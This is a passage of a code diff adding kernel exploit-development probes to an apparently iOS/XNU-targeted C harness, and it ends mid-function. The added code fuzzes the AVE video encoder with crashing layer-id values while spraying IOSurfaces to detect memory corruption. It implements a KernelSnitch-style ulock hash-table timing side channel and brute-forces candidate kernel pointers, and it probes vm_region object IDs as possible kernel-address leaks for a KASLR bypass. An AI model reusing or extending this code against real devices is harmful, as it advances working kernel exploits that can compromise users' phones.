@@ -8743,6 +8743,259 @@ r326_done:
    Inspired by: Xbox King Kong (shader wrote to arbitrary memory via shared region),
    PS4 NamedObj exploit (use-after-free type confusion for KASLR bypass). */
 
+static volatile int g_r332_crash_caught = 0;
+static volatile int g_r332_crash_lid = 0;
+static volatile int g_r332_crash_enc = 0;
+
+static void *r332_exc_handler(void *arg) {
+    mach_port_t exc_port = (mach_port_t)(uintptr_t)arg;
+    while (1) {
+        struct {
+            mach_msg_header_t head;
+            mach_msg_body_t body;
+            mach_msg_port_descriptor_t thread;
+            mach_msg_port_descriptor_t task;
+            NDR_record_t NDR;
+            exception_type_t exception;
+            mach_msg_type_number_t code_cnt;
+            integer_t code[2];
+            int flavor;
+            mach_msg_type_number_t state_cnt;
+            natural_t state[224];
+        } msg;
+        mach_msg_header_t reply;
+
+        kern_return_t kr = mach_msg(&msg.head, MACH_RCV_MSG, 0,
+            sizeof(msg), exc_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+        if (kr != KERN_SUCCESS) break;
+
+        g_r332_crash_caught = 1;
+        rlog("  !!! EXCEPTION CAUGHT: type=%d code=[0x%x, 0x%x] !!!\n",
+             msg.exception, msg.code[0], msg.code_cnt > 1 ? msg.code[1] : 0);
+        rlog("  !!! lid=0x%x enc=%d !!!\n", g_r332_crash_lid, g_r332_crash_enc);
+
+        /* Reply with KERN_FAILURE to let default handler run */
+        reply.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND_ONCE, 0);
+        reply.msgh_size = sizeof(reply);
+        reply.msgh_remote_port = msg.head.msgh_remote_port;
+        reply.msgh_local_port = MACH_PORT_NULL;
+        reply.msgh_id = msg.head.msgh_id + 100;
+        mach_msg(&reply, MACH_SEND_MSG, sizeof(reply), 0,
+            MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
+    }
+    return NULL;
+}
+
+static void r332_probe(void) {
+    rlog("\n=== r332: AVE Crash Boundary + IOSurface Corruption Check ===\n");
+    rlog("  r331 found: lid=0x1,0x2 survive 350 enc, lid=0x3 CRASHES\n");
+    rlog("  Strategy: Spray IOSurfaces, then encode with crashing lid values\n");
+    rlog("  Check for IOSurface corruption BEFORE and AFTER crash\n\n");
+    fflush(stdout);
+
+    if (phase1_verify() != 0) return;
+
+    /* Set up Mach exception handler */
+    mach_port_t exc_port;
+    kern_return_t kr = mach_port_allocate(mach_task_self(),
+        MACH_PORT_RIGHT_RECEIVE, &exc_port);
+    if (kr == KERN_SUCCESS) {
+        kr = mach_port_insert_right(mach_task_self(), exc_port, exc_port,
+            MACH_MSG_TYPE_MAKE_SEND);
+    }
+    rlog("  Exception port: kr=%d port=0x%x\n", kr, exc_port);
+
+    pthread_t exc_thread;
+    if (kr == KERN_SUCCESS) {
+        pthread_create(&exc_thread, NULL, r332_exc_handler,
+            (void *)(uintptr_t)exc_port);
+        pthread_detach(exc_thread);
+        kr = task_set_exception_ports(mach_task_self(),
+            EXC_MASK_BAD_ACCESS | EXC_MASK_BAD_INSTRUCTION,
+            exc_port, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, 0);
+        rlog("  task_set_exception_ports: kr=%d\n", kr);
+    }
+
+    /* Part 1: Narrow the crash boundary */
+    rlog("\n--- Part 1: Crash boundary scan (lid 3-10, careful encode) ---\n");
+    int crash_lids[16];
+    int crash_at_enc[16];
+    int ncrash = 0;
+    int survive_lids[16];
+    int survive_max[16];
+    int nsurvive = 0;
+
+    int test_lids[] = {3, 4, 5, 6, 7, 8, 9, 10, 15, 20, 50, 100, 0x100, 0x4141};
+    int nlids = sizeof(test_lids) / sizeof(test_lids[0]);
+
+    for (int t = 0; t < nlids; t++) {
+        int lid = test_lids[t];
+        g_r332_crash_lid = lid;
+        g_r332_crash_caught = 0;
+
+        rlog("  lid=0x%x: ", lid);
+        fflush(stdout);
+
+        VTCompressionSessionRef s = create_mvhevc_encoder(1920, 1080, lid);
+        if (!s) {
+            rlog("FAILED to create\n");
+            continue;
+        }
+
+        int enc_ok = 0;
+        int last_err = 0;
+        for (int i = 0; i < 250; i++) {
+            g_r332_crash_enc = i;
+            int st = encode_one_stereo_lid(s, i, 1920, 1080, lid);
+            if (st != 0) {
+                last_err = st;
+                rlog("err at %d (st=%d) ", i, st);
+                if (i < 3) break; /* Can't even start */
+                /* Try to continue a bit */
+                int more_err = 0;
+                for (int j = i+1; j < i+5 && j < 250; j++) {
+                    g_r332_crash_enc = j;
+                    if (encode_one_stereo_lid(s, j, 1920, 1080, lid) != 0)
+                        more_err++;
+                }
+                if (more_err >= 3) break;
+                enc_ok += (5 - more_err);
+                i += 4;
+            } else {
+                enc_ok++;
+            }
+        }
+
+        rlog("%d OK", enc_ok);
+        if (g_r332_crash_caught) {
+            rlog(" EXCEPTION_CAUGHT");
+            if (ncrash < 16) {
+                crash_lids[ncrash] = lid;
+                crash_at_enc[ncrash] = enc_ok;
+                ncrash++;
+            }
+        } else if (enc_ok >= 200) {
+            rlog(" SURVIVED");
+            if (nsurvive < 16) {
+                survive_lids[nsurvive] = lid;
+                survive_max[nsurvive] = enc_ok;
+                nsurvive++;
+            }
+        }
+        rlog("\n");
+
+        VTCompressionSessionInvalidate(s);
+        CFRelease(s);
+        usleep(100000);
+    }
+
+    rlog("\n  Summary: %d survived, %d crashed\n", nsurvive, ncrash);
+    for (int i = 0; i < ncrash; i++)
+        rlog("    crash: lid=0x%x at enc=%d\n", crash_lids[i], crash_at_enc[i]);
+    for (int i = 0; i < nsurvive; i++)
+        rlog("    survive: lid=0x%x max=%d\n", survive_lids[i], survive_max[i]);
+
+    /* Part 2: If we have a crashing lid, spray IOSurfaces first and check */
+    int target_lid = ncrash > 0 ? crash_lids[0] : (nlids > 0 ? test_lids[0] : 3);
+    int target_max = ncrash > 0 ? crash_at_enc[0] : 150;
+    if (target_max < 10) target_max = 150;
+
+    rlog("\n--- Part 2: IOSurface spray + encode with lid=0x%x (stop at %d) ---\n",
+         target_lid, target_max > 5 ? target_max - 5 : target_max);
+
+    #define R332_SPRAY 32
+    IOSurfaceRef r332_surfs[R332_SPRAY] = {0};
+    uint32_t r332_ids[R332_SPRAY] = {0};
+    uint32_t r332_baselines[R332_SPRAY] = {0};
+
+    rlog("  Pre-spray %d surfaces\n", R332_SPRAY/2);
+    for (int i = 0; i < R332_SPRAY/2; i++) {
+        r332_surfs[i] = create_spray_surface(i);
+        if (r332_surfs[i]) {
+            r332_ids[i] = IOSurfaceGetID(r332_surfs[i]);
+            IOSurfaceLock(r332_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            void *b = IOSurfaceGetBaseAddress(r332_surfs[i]);
+            r332_baselines[i] = b ? *(uint32_t *)b : 0;
+            IOSurfaceUnlock(r332_surfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+    }
+
+    rlog("  Creating encoder lid=0x%x\n", target_lid);
+    VTCompressionSessionRef s332 = create_mvhevc_encoder(1920, 1080, target_lid);
+
+    rlog("  Post-spray %d surfaces\n", R332_SPRAY/2);
+    for (int i = R332_SPRAY/2; i < R332_SPRAY; i++) {
+        r332_surfs[i] = create_spray_surface(i);
+        if (r332_surfs[i]) {
+            r332_ids[i] = IOSurfaceGetID(r332_surfs[i]);
+            IOSurfaceLock(r332_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            void *b = IOSurfaceGetBaseAddress(r332_surfs[i]);
+            r332_baselines[i] = b ? *(uint32_t *)b : 0;
+            IOSurfaceUnlock(r332_surfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+    }
+
+    if (s332) {
+        int safe_max = target_max > 5 ? target_max - 5 : target_max;
+        rlog("  Encoding %d frames (stopping before crash point)\n", safe_max);
+        int enc_ok = 0;
+        for (int i = 0; i < safe_max; i++) {
+            g_r332_crash_enc = i;
+            g_r332_crash_lid = target_lid;
+            int st = encode_one_stereo_lid(s332, i, 1920, 1080, target_lid);
+            if (st != 0) {
+                rlog("  Error at encode %d: %d\n", i, st);
+                break;
+            }
+            enc_ok++;
+        }
+        rlog("  Encoded %d OK\n", enc_ok);
+
+        /* Check surfaces for corruption */
+        rlog("  Checking surfaces for corruption...\n");
+        int corrupted = 0;
+        for (int i = 0; i < R332_SPRAY; i++) {
+            if (!r332_surfs[i]) continue;
+            IOSurfaceLock(r332_surfs[i], kIOSurfaceLockReadOnly, NULL);
+            void *b = IOSurfaceGetBaseAddress(r332_surfs[i]);
+            if (b) {
+                uint32_t cur = *(uint32_t *)b;
+                uint32_t id_now = IOSurfaceGetID(r332_surfs[i]);
+                if (cur != r332_baselines[i]) {
+                    rlog("  !!! SURF %d DATA CHANGED: 0x%x -> 0x%x !!!\n",
+                         i, r332_baselines[i], cur);
+                    corrupted++;
+                    uint8_t *p = (uint8_t *)b;
+                    for (int r = 0; r < 4; r++) {
+                        rlog("    +%03x:", r*16);
+                        for (int c = 0; c < 16; c++)
+                            rlog(" %02x", p[r*16+c]);
+                        rlog("\n");
+                    }
+                }
+                if (id_now != r332_ids[i]) {
+                    rlog("  !!! SURF %d ID CHANGED: %u -> %u !!!\n",
+                         i, r332_ids[i], id_now);
+                    corrupted++;
+                }
+            }
+            IOSurfaceUnlock(r332_surfs[i], kIOSurfaceLockReadOnly, NULL);
+        }
+        rlog("  Corrupted: %d / %d\n", corrupted, R332_SPRAY);
+
+        VTCompressionSessionInvalidate(s332);
+        CFRelease(s332);
+    } else {
+        rlog("  FAILED to create encoder\n");
+    }
+
+    for (int i = 0; i < R332_SPRAY; i++)
+        if (r332_surfs[i]) CFRelease(r332_surfs[i]);
+    #undef R332_SPRAY
+
+    rlog("\n=== r332 complete ===\n");
+}
+
 static void r331_probe(void) {
     rlog("\n=== r331: AVE Table Overflow Layer-ID Survival Scan ===\n");
     rlog("  Strategy: Find layer_id values that survive table 1 crash at +0x5C70\n");
@@ -10459,6 +10712,391 @@ static void r328_probe(void) {
    4) Exception handling timing (EXC_BAD_ACCESS at different addresses)
    5) DRAM row buffer timing (page coloring oracle)
    6) Shared cache region correlation with kernel slide */
+
+/* ============================================================
+   r335: KernelSnitch-adapted XNU Hash Table Timing Probe
+   ============================================================
+   Research basis: KernelSnitch (Maar et al., NDSS 2025 + 2026 practical paper)
+   - Hardware-agnostic timing side channel on kernel hash tables
+   - Applied to macOS as CVE-2026-43754 (fixed macOS Tahoe 26.6)
+   - No iOS fix listed → may still be exploitable on iOS 27.1
+
+   XNU hash table targets:
+   A) __ulock_wait / __ulock_wake (SYS 515/516) — XNU's futex equivalent
+      Hash: ull_hash_index(pid, uaddr) — test if kernel pointer is in hash
+   B) psynch_mutexwait / psynch_mutexdrop — POSIX sync hash tables
+   C) os_sync_wait_on_address — modern XNU futex (iOS 17+)
+   D) Mach port / turnstile timing — priority inheritance hash tables
+
+   Method: Pile up waiters → measure wake timing → find collisions
+           → brute-force kernel address from collision set */
+
+#include <pthread.h>
+
+#define SNITCH_THREADS 64
+#define SNITCH_MEASURE_REPS 64
+#define SNITCH_AVERAGE 8
+#define SNITCH_PROBE_ADDRS 2048
+#define SNITCH_THRESHOLD_MULT 20
+
+/* ulock operation codes */
+#ifndef UL_COMPARE_AND_WAIT
+#define UL_COMPARE_AND_WAIT        1
+#endif
+#ifndef UL_COMPARE_AND_WAIT_SHARED
+#define UL_COMPARE_AND_WAIT_SHARED 3
+#endif
+#ifndef ULF_NO_ERRNO
+#define ULF_NO_ERRNO 0x01000000
+#endif
+
+struct snitch_waiter_arg {
+    volatile uint32_t *addr;
+    int done;
+};
+
+static void *snitch_waiter_thread(void *arg) {
+    struct snitch_waiter_arg *wa = (struct snitch_waiter_arg *)arg;
+    /* __ulock_wait: syscall 515, wait while *addr == 0 */
+    syscall(515, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, wa->addr, 0, 0, 0);
+    wa->done = 1;
+    return NULL;
+}
+
+static uint64_t snitch_measure_wake(volatile uint32_t *addr) {
+    uint64_t times[SNITCH_MEASURE_REPS];
+    for (int i = 0; i < SNITCH_MEASURE_REPS; i++) {
+        uint64_t t0 = mach_absolute_time();
+        /* __ulock_wake: syscall 516, wake waiters on addr */
+        syscall(516, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, addr, 0, 0, 0);
+        uint64_t t1 = mach_absolute_time();
+        times[i] = t1 - t0;
+    }
+    /* Sort and take average of lowest N */
+    for (int i = 0; i < SNITCH_MEASURE_REPS - 1; i++)
+        for (int j = i + 1; j < SNITCH_MEASURE_REPS; j++)
+            if (times[j] < times[i]) { uint64_t t = times[i]; times[i] = times[j]; times[j] = t; }
+    uint64_t avg = 0;
+    for (int i = 0; i < SNITCH_AVERAGE; i++) avg += times[i];
+    return avg / SNITCH_AVERAGE;
+}
+
+/* Jenkins hash (jhash2) — same as Linux kernel and XNU may use internally */
+static inline uint32_t snitch_rol32(uint32_t word, unsigned int shift) {
+    return (word << (shift & 31)) | (word >> ((-shift) & 31));
+}
+#define SNITCH_JHASH_INITVAL 0xdeadbeef
+#define snitch_jhash_mix(a, b, c) { \
+    a -= c; a ^= snitch_rol32(c, 4);  c += b; \
+    b -= a; b ^= snitch_rol32(a, 6);  a += c; \
+    c -= b; c ^= snitch_rol32(b, 8);  b += a; \
+    a -= c; a ^= snitch_rol32(c, 16); c += b; \
+    b -= a; b ^= snitch_rol32(a, 19); a += c; \
+    c -= b; c ^= snitch_rol32(b, 4);  b += a; \
+}
+#define snitch_jhash_final(a, b, c) { \
+    c ^= b; c -= snitch_rol32(b, 14); \
+    a ^= c; a -= snitch_rol32(c, 11); \
+    b ^= a; b -= snitch_rol32(a, 25); \
+    c ^= b; c -= snitch_rol32(b, 16); \
+    a ^= c; a -= snitch_rol32(c, 4);  \
+    b ^= a; b -= snitch_rol32(a, 14); \
+    c ^= b; c -= snitch_rol32(b, 24); \
+}
+
+static uint32_t snitch_jhash_3words(uint32_t a, uint32_t b, uint32_t c, uint32_t initval) {
+    a += initval + SNITCH_JHASH_INITVAL + (3 << 2);
+    b += initval + SNITCH_JHASH_INITVAL + (3 << 2);
+    c += initval + SNITCH_JHASH_INITVAL + (3 << 2);
+    snitch_jhash_final(a, b, c);
+    return c;
+}
+
+/* Simulate XNU ull_hash_index — hash(pid, addr) */
+static uint32_t snitch_ull_hash(uint32_t pid, uint64_t addr, uint32_t table_sz) {
+    uint32_t a = (uint32_t)(addr & 0xFFFFFFFF);
+    uint32_t b = (uint32_t)(addr >> 32);
+    return snitch_jhash_3words(a, b, pid, 0) % table_sz;
+}
+
+/* Simulate futex_hash with kernel pointer — hash(uaddr, kptr) */
+static uint32_t snitch_futex_hash(uint64_t uaddr, uint64_t kptr, uint32_t table_sz) {
+    /* Linux-style: key = {.mm = kptr, .address = uaddr & ~0xfff, .offset = uaddr & 0xfff} */
+    uint32_t k[4];
+    k[0] = (uint32_t)(kptr & 0xFFFFFFFF);
+    k[1] = (uint32_t)(kptr >> 32);
+    k[2] = (uint32_t)((uaddr & ~0xFFFULL) & 0xFFFFFFFF);
+    k[3] = (uint32_t)((uaddr & ~0xFFFULL) >> 32);
+    uint32_t offset = (uint32_t)(uaddr & 0xFFF);
+    /* jhash2 of k[0..3] with initval=offset */
+    uint32_t aa, bb, cc;
+    aa = bb = cc = SNITCH_JHASH_INITVAL + (4 << 2) + offset;
+    aa += k[0]; bb += k[1]; cc += k[2];
+    snitch_jhash_mix(aa, bb, cc);
+    aa += k[3];
+    snitch_jhash_final(aa, bb, cc);
+    return cc & (table_sz - 1);
+}
+
+static void r335_kernelsnitch_probe(void) {
+    rlog("\n=== r335: KernelSnitch-Adapted XNU Hash Table Timing ===\n");
+    rlog("Based on: Maar et al. NDSS 2025, CVE-2026-43754 (macOS)\n\n");
+
+    /* ---- Part A: ulock timing baseline ---- */
+    rlog("--- Part A: __ulock_wake timing baseline ---\n");
+
+    /* Allocate probe pages — each probe address is on a separate page */
+    size_t probe_region_sz = SNITCH_PROBE_ADDRS * 4096;
+    volatile uint32_t *probe_base = (volatile uint32_t *)mmap(NULL, probe_region_sz,
+        PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+    if (probe_base == MAP_FAILED) {
+        rlog("  FAIL: mmap probe region: %s\n", strerror(errno));
+        return;
+    }
+    memset((void *)probe_base, 0, probe_region_sz);
+
+    /* Measure baseline wake timing (no waiters) on a few addresses */
+    uint64_t baseline_times[16];
+    for (int i = 0; i < 16; i++) {
+        volatile uint32_t *addr = (volatile uint32_t *)((char *)probe_base + i * 4096);
+        baseline_times[i] = snitch_measure_wake(addr);
+    }
+    uint64_t baseline_avg = 0;
+    for (int i = 0; i < 16; i++) baseline_avg += baseline_times[i];
+    baseline_avg /= 16;
+    rlog("  Baseline wake timing (no waiters): avg=%llu ticks\n", baseline_avg);
+    for (int i = 0; i < 8; i++)
+        rlog("    addr[%d]=%llu  ", i, baseline_times[i]);
+    rlog("\n");
+
+    /* ---- Part B: Pile up waiters on ONE address ---- */
+    rlog("\n--- Part B: Pile up %d waiters on target address ---\n", SNITCH_THREADS);
+
+    volatile uint32_t *target_addr = (volatile uint32_t *)((char *)probe_base + 128 * 4096);
+    *target_addr = 0; /* waiters wait while value == 0 */
+
+    pthread_t waiter_tids[SNITCH_THREADS];
+    struct snitch_waiter_arg waiter_args[SNITCH_THREADS];
+    int waiters_created = 0;
+
+    for (int i = 0; i < SNITCH_THREADS; i++) {
+        waiter_args[i].addr = target_addr;
+        waiter_args[i].done = 0;
+        if (pthread_create(&waiter_tids[i], NULL, snitch_waiter_thread, &waiter_args[i]) == 0)
+            waiters_created++;
+        else break;
+    }
+    usleep(50000); /* 50ms — let all threads enter __ulock_wait */
+    rlog("  Created %d waiter threads on %p\n", waiters_created, (void *)target_addr);
+
+    /* Measure timing on target addr (with waiters) */
+    uint64_t loaded_time = snitch_measure_wake(target_addr);
+    rlog("  Loaded timing (with %d waiters): %llu ticks\n", waiters_created, loaded_time);
+    rlog("  Ratio loaded/baseline: %.1f\n", (double)loaded_time / (double)(baseline_avg ? baseline_avg : 1));
+
+    /* ---- Part C: Scan many addresses for collisions ---- */
+    rlog("\n--- Part C: Scanning %d addresses for hash collisions ---\n", SNITCH_PROBE_ADDRS);
+
+    int collision_count = 0;
+    uint64_t collision_addrs[64];
+    uint64_t collision_times[64];
+    uint64_t max_time = 0, min_time = UINT64_MAX;
+
+    for (int i = 0; i < SNITCH_PROBE_ADDRS && collision_count < 64; i++) {
+        if (i == 128) continue; /* skip our target */
+        volatile uint32_t *addr = (volatile uint32_t *)((char *)probe_base + i * 4096);
+        uint64_t t = snitch_measure_wake(addr);
+        if (t > max_time) max_time = t;
+        if (t < min_time) min_time = t;
+
+        if (t > baseline_avg * SNITCH_THRESHOLD_MULT) {
+            collision_addrs[collision_count] = (uint64_t)addr;
+            collision_times[collision_count] = t;
+            collision_count++;
+        }
+
+        /* Log some samples */
+        if (i < 16 || (i % 256 == 0))
+            rlog("  addr[%d]=%p time=%llu%s\n", i, (void *)addr, t,
+                 (t > baseline_avg * 5) ? " <-- ELEVATED" : "");
+    }
+
+    rlog("  Scan complete: min=%llu max=%llu baseline=%llu\n", min_time, max_time, baseline_avg);
+    rlog("  Collisions found (>%dx baseline): %d\n", SNITCH_THRESHOLD_MULT, collision_count);
+
+    for (int i = 0; i < collision_count && i < 16; i++)
+        rlog("    collision[%d]: addr=%p time=%llu (%.1fx)\n", i,
+             (void *)collision_addrs[i], collision_times[i],
+             (double)collision_times[i] / (double)(baseline_avg ? baseline_avg : 1));
+
+    /* ---- Part D: Hash function analysis ---- */
+    rlog("\n--- Part D: Hash function analysis ---\n");
+    pid_t mypid = getpid();
+    rlog("  My PID: %d\n", mypid);
+
+    /* Compute predicted hashes assuming ulock uses (pid, addr) */
+    uint32_t table_sizes[] = {64, 128, 256, 512, 1024};
+    for (int ts = 0; ts < 5; ts++) {
+        uint32_t tsz = table_sizes[ts];
+        uint32_t target_bucket = snitch_ull_hash(mypid, (uint64_t)target_addr, tsz);
+        rlog("  table_sz=%u: target bucket=%u\n", tsz, target_bucket);
+
+        int predicted_collisions = 0;
+        for (int i = 0; i < 32 && i < collision_count; i++) {
+            uint32_t bucket = snitch_ull_hash(mypid, collision_addrs[i], tsz);
+            if (bucket == target_bucket) predicted_collisions++;
+            if (i < 8)
+                rlog("    coll[%d] predicted_bucket=%u %s\n", i, bucket,
+                     bucket == target_bucket ? "MATCH" : "mismatch");
+        }
+        rlog("    Predicted match rate: %d/%d\n", predicted_collisions,
+             collision_count < 32 ? collision_count : 32);
+    }
+
+    /* ---- Part E: Test if kernel pointer is in hash ---- */
+    rlog("\n--- Part E: Kernel pointer hypothesis test ---\n");
+    rlog("  If collisions DON'T match (pid,addr) hash → kernel ptr is in the hash\n");
+    rlog("  If they DO match → no kernel ptr, ulock hash is (pid,addr) only\n\n");
+
+    if (collision_count >= 4) {
+        rlog("  Attempting brute-force with futex-style hash (uaddr, kptr)...\n");
+        /* Try XNU kernel heap range: 0xffffffe000000000 - 0xfffffffe00000000 */
+        /* On arm64e iOS, kernel heap is typically in this range */
+        uint64_t kstart = 0xffffffe000000000ULL;
+        uint64_t kend   = 0xfffffffe00000000ULL;
+        uint64_t kstep  = 0x4000; /* page-aligned, typical object alignment */
+
+        /* Use power-of-2 table size for futex hash */
+        uint32_t ftable_sz = 4096; /* typical futex hash table size */
+
+        uint64_t ref_addr = collision_addrs[0];
+        uint32_t ref_bucket_target = 0; /* unknown — we need to find it */
+
+        /* For each candidate kernel pointer, check if all collision addrs hash to same bucket */
+        int candidates_tested = 0;
+        int candidates_found = 0;
+        uint64_t found_kptr = 0;
+
+        for (uint64_t kptr = kstart; kptr < kend && candidates_found == 0; kptr += kstep) {
+            uint32_t bucket0 = snitch_futex_hash((uint64_t)target_addr, kptr, ftable_sz);
+            int all_match = 1;
+            for (int i = 0; i < collision_count && all_match; i++) {
+                uint32_t bucket_i = snitch_futex_hash(collision_addrs[i], kptr, ftable_sz);
+                if (bucket_i != bucket0) all_match = 0;
+            }
+            if (all_match) {
+                candidates_found++;
+                found_kptr = kptr;
+                rlog("  CANDIDATE kptr=0x%016llx bucket=%u\n", kptr, bucket0);
+            }
+            candidates_tested++;
+            if (candidates_tested % 10000000 == 0)
+                rlog("  ... tested %d candidates (at 0x%016llx)\n", candidates_tested, kptr);
+
+            /* Limit search time — test ~1M candidates */
+            if (candidates_tested >= 1000000) {
+                rlog("  Search limit reached (%d tested)\n", candidates_tested);
+                break;
+            }
+        }
+
+        if (candidates_found > 0) {
+            rlog("  *** POTENTIAL KERNEL POINTER: 0x%016llx ***\n", found_kptr);
+        } else {
+            rlog("  No candidates found in search range\n");
+        }
+    } else {
+        rlog("  Not enough collisions (%d) to attempt brute-force\n", collision_count);
+    }
+
+    /* ---- Part F: psynch timing test ---- */
+    rlog("\n--- Part F: psynch_mutexdrop timing ---\n");
+    /* psynch_mutexdrop = SYS 302 on arm64 iOS */
+    /* Test a few calls to see if they return useful timing data */
+    for (int i = 0; i < 4; i++) {
+        volatile uint32_t *addr = (volatile uint32_t *)((char *)probe_base + (256 + i) * 4096);
+        uint64_t t0 = mach_absolute_time();
+        /* psynch_mutexdrop(addr, lgenval, ugenval, tid, flags) */
+        long kr = syscall(302, addr, 0, 0, 0, 0);
+        uint64_t t1 = mach_absolute_time();
+        rlog("  psynch_mutexdrop[%d]: kr=%ld time=%llu\n", i, kr, t1 - t0);
+    }
+
+    /* ---- Part G: os_sync_wait_on_address timing (iOS 17+) ---- */
+    rlog("\n--- Part G: os_sync_wait_on_address timing ---\n");
+    /* os_sync_wake_by_address_any = SYS 561 on recent iOS */
+    /* os_sync_wait_on_address = SYS 557 */
+    for (int i = 0; i < 4; i++) {
+        volatile uint32_t *addr = (volatile uint32_t *)((char *)probe_base + (512 + i) * 4096);
+        *addr = 1; /* non-matching value so wake returns immediately */
+        uint64_t t0 = mach_absolute_time();
+        long kr = syscall(561, addr, 0, 0); /* os_sync_wake_by_address_any */
+        uint64_t t1 = mach_absolute_time();
+        rlog("  os_sync_wake[%d]: kr=%ld errno=%d time=%llu\n", i, kr, errno, t1 - t0);
+    }
+
+    /* ---- Part H: Mach trap timing with kernel address probes ---- */
+    rlog("\n--- Part H: Mach trap speculative timing (SysBumps-inspired) ---\n");
+    /* Time mach_port_type with valid vs invalid port names */
+    mach_port_type_t ptype;
+    uint64_t valid_times[8], invalid_times[8];
+
+    for (int i = 0; i < 8; i++) {
+        uint64_t t0 = mach_absolute_time();
+        mach_port_type(mach_task_self(), mach_task_self(), &ptype);
+        uint64_t t1 = mach_absolute_time();
+        valid_times[i] = t1 - t0;
+    }
+    for (int i = 0; i < 8; i++) {
+        uint64_t t0 = mach_absolute_time();
+        mach_port_type(mach_task_self(), 0x12345600 + i * 4, &ptype);
+        uint64_t t1 = mach_absolute_time();
+        invalid_times[i] = t1 - t0;
+    }
+
+    uint64_t v_avg = 0, inv_avg = 0;
+    for (int i = 0; i < 8; i++) { v_avg += valid_times[i]; inv_avg += invalid_times[i]; }
+    v_avg /= 8; inv_avg /= 8;
+    rlog("  mach_port_type valid=%llu invalid=%llu ratio=%.2f\n", v_avg, inv_avg,
+         (double)v_avg / (double)(inv_avg ? inv_avg : 1));
+
+    /* Test vm_allocate / vm_deallocate timing at different address hints */
+    rlog("\n  vm_allocate timing with address hints:\n");
+    uint64_t kprobes[] = {
+        0xffffffe000000000ULL, 0xffffffe100000000ULL,
+        0xffffffe200000000ULL, 0xffffffe400000000ULL,
+        0xfffffff000000000ULL, 0xfffffff800000000ULL,
+        0x0000000100000000ULL, 0x0000000200000000ULL
+    };
+    for (int i = 0; i < 8; i++) {
+        mach_vm_address_t addr = kprobes[i];
+        uint64_t t0 = mach_absolute_time();
+        kern_return_t kr = mach_vm_allocate(mach_task_self(), &addr, 0x4000, VM_FLAGS_FIXED);
+        uint64_t t1 = mach_absolute_time();
+        rlog("    0x%016llx: kr=%d time=%llu\n", kprobes[i], kr, t1 - t0);
+        if (kr == 0) mach_vm_deallocate(mach_task_self(), addr, 0x4000);
+    }
+
+    /* ---- Cleanup ---- */
+    rlog("\n--- Cleanup ---\n");
+    /* Wake all waiters */
+    *target_addr = 1;
+    for (int i = 0; i < waiters_created; i++) {
+        syscall(516, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, target_addr, 0, 0, 0);
+    }
+    usleep(50000);
+    /* Additional wakeup attempts */
+    for (int w = 0; w < 10; w++)
+        syscall(516, UL_COMPARE_AND_WAIT | ULF_NO_ERRNO, target_addr, 0, 0, 0);
+
+    for (int i = 0; i < waiters_created; i++) {
+        pthread_join(waiter_tids[i], NULL);
+    }
+
+    munmap((void *)probe_base, probe_region_sz);
+    rlog("  Cleanup complete\n");
+    rlog("\n=== r335 KernelSnitch probe complete ===\n");
+}
 
 static void r331_timing_probe(void) {
     rlog("\n=== r331: Timing Side-Channel + MTE Oracle ===\n");
@@ -13237,12 +13875,236 @@ static void r334_probe(void) {
     fflush(stdout);
 }
 
+/* r335: vm_region object_id deep exploitation — potential KASLR bypass
+   r334: vm_region_recurse found regions with high/negative object_ids (stack tag=30).
+   obj_id=0x9BB05767 (-1683626649), 0xE4A5FF0B (-459828229), 0x941C03D9 (-1807128759).
+   These 32-bit values may be truncated kernel VM object addresses.
+   Strategy: probe all vm_region flavors for full 64-bit object pointers.
+   Also try mach_vm_region (non-recurse) and vm_region_top_info. */
+static void r335_probe(void) {
+    rlog("\n=== r335: vm_region Object ID Deep Exploit ===\n");
+    rlog("  r334: vm_region_recurse found high obj_ids in stack/shared regions.\n");
+    rlog("  Strategy: all vm_region flavors, full 64-bit object pointers.\n\n");
+    fflush(stdout);
+
+    rlog("--- Part 1: mach_vm_region with all flavors ---\n");
+    fflush(stdout);
+    {
+        /* VM_REGION_BASIC_INFO_64 */
+        uint64_t addr = 0;
+        uint64_t size = 0;
+        vm_region_basic_info_data_64_t basic;
+        mach_msg_type_number_t cnt = VM_REGION_BASIC_INFO_COUNT_64;
+        mach_port_t obj_name = MACH_PORT_NULL;
+        kern_return_t kr = mach_vm_region(mach_task_self(), &addr, &size,
+            VM_REGION_BASIC_INFO_64, (vm_region_info_t)&basic, &cnt, &obj_name);
+        rlog("  basic_info_64: kr=%d addr=0x%llx size=0x%llx obj_name=0x%x\n",
+             kr, (unsigned long long)addr, (unsigned long long)size, obj_name);
+        if (kr == 0) {
+            rlog("    prot=%d max=%d inherit=%d shared=%d reserved=%d\n",
+                 basic.protection, basic.max_protection, basic.inheritance,
+                 basic.shared, basic.reserved);
+            rlog("    offset=0x%llx behavior=%d user_wired=%d\n",
+                 (unsigned long long)basic.offset, basic.behavior, basic.user_wired_count);
+            if (obj_name != MACH_PORT_NULL) {
+                rlog("    !!! OBJ_NAME PORT: 0x%x !!!\n", obj_name);
+            }
+        }
+
+        /* VM_REGION_EXTENDED_INFO */
+        addr = 0; size = 0;
+        vm_region_extended_info_data_t ext;
+        cnt = VM_REGION_EXTENDED_INFO_COUNT;
+        obj_name = MACH_PORT_NULL;
+        kr = mach_vm_region(mach_task_self(), &addr, &size,
+            VM_REGION_EXTENDED_INFO, (vm_region_info_t)&ext, &cnt, &obj_name);
+        rlog("  extended_info: kr=%d addr=0x%llx\n", kr, (unsigned long long)addr);
+        if (kr == 0) {
+            rlog("    user_tag=%d pages_res=%d pages_shared=%d pages_dirty=%d\n",
+                 ext.user_tag, ext.pages_resident, ext.pages_shared_now_private,
+                 ext.pages_dirtied);
+            rlog("    ref_count=%d shadow_depth=%d share_mode=%d\n",
+                 ext.ref_count, ext.shadow_depth, ext.share_mode);
+            rlog("    external_pager=%d\n", ext.external_pager);
+            if (obj_name != MACH_PORT_NULL) {
+                rlog("    !!! OBJ_NAME PORT: 0x%x !!!\n", obj_name);
+            }
+        }
+    }
